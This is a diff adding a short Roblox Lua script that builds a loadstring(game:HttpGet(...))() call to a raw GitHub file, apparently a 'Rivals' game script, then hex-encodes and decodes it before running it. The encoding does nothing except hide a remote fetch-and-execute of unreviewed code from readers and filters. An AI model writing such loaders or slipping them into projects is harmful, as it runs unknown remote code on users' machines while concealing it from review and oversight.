@@ -1,0 +1,23 @@
+local part1 = "loadstring(game:HttpGet(\"https://"
+local part2 = "raw.githubusercontent.com/UnknownUser2883/Script/main/Rivals"
+local part3 = "\"))()"
+local fullScript = part1 .. part2 .. part3
+
+local function decodeAndRun(encoded)
+    local decoded = ""
+    for i = 1, #encoded, 2 do
+        local hexByte = encoded:sub(i, i + 1)
+        local char = string.char(tonumber(hexByte, 16))
+        decoded = decoded .. char
+    end
+    loadstring(decoded)()
+end
+
+local encodedScript = ""
+for i = 1, #fullScript do
+    local char = fullScript:sub(i, i)
+    local hexByte = string.format("%02X", string.byte(char))
+    encodedScript = encodedScript .. hexByte
+end
+
+decodeAndRun(encodedScript)
